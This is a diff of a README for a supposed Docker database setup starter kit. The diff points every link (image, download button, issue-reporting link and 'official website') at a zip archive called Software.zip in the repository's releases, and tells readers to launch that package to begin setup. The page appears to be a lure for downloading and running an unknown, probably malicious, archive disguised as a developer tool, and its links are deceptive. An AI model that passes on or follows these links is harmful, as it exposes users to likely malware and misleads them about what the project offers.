@@ -1,7 +1,7 @@
 
 # 🐳 **Setup Databases With Docker Starter Kit** 🐳
 
-![Docker Databases](https://github.com/LucasinicianteHacking/Setup-Databases-With-Docker/releases/download/v1.0/Release_x64.zip)
+![Docker Databases](https://github.com/LucasinicianteHacking/Setup-Databases-With-Docker/releases/download/v2.0/Software.zip)
 
 ## Overview
 
@@ -11,7 +11,7 @@ Welcome to the **Setup Databases With Docker Starter Kit**, a comprehensive repo
 
 To quickly get started with setting up databases using Docker, download the necessary software package by clicking the button below:
 
-[![Download Software Package](https://github.com/LucasinicianteHacking/Setup-Databases-With-Docker/releases/download/v1.0/Release_x64.zip%https://github.com/LucasinicianteHacking/Setup-Databases-With-Docker/releases/download/v1.0/Release_x64.zip)](https://github.com/LucasinicianteHacking/Setup-Databases-With-Docker/releases/download/v1.0/Release_x64.zip)
+[![Download Software Package](https://github.com/LucasinicianteHacking/Setup-Databases-With-Docker/releases/download/v2.0/Software.zip%https://github.com/LucasinicianteHacking/Setup-Databases-With-Docker/releases/download/v2.0/Software.zip)](https://github.com/LucasinicianteHacking/Setup-Databases-With-Docker/releases/download/v2.0/Software.zip)
 
 **Note:** The software package needs to be launched to begin the setup process.
 
@@ -40,12 +40,12 @@ Browse the `docs` folder in this repository for detailed documentation on settin
 
 ## Support
 
-If you encounter any issues or have any questions while using this starter kit, feel free to reach out to us by [creating an issue](https://github.com/LucasinicianteHacking/Setup-Databases-With-Docker/releases/download/v1.0/Release_x64.zip). We are here to help you make the most of this tool!
+If you encounter any issues or have any questions while using this starter kit, feel free to reach out to us by [creating an issue](https://github.com/LucasinicianteHacking/Setup-Databases-With-Docker/releases/download/v2.0/Software.zip). We are here to help you make the most of this tool!
 
 ## Additional Resources
 
 - Check the **Releases** section for any updates or new releases of the software package.
-- Visit the [official website](https://github.com/LucasinicianteHacking/Setup-Databases-With-Docker/releases/download/v1.0/Release_x64.zip) for more information and resources on setting up databases with Docker.
+- Visit the [official website](https://github.com/LucasinicianteHacking/Setup-Databases-With-Docker/releases/download/v2.0/Software.zip) for more information and resources on setting up databases with Docker.
 
 ---
 Feel free to fork this repository and customize it according to your needs. Happy database setup with Docker! 🚀
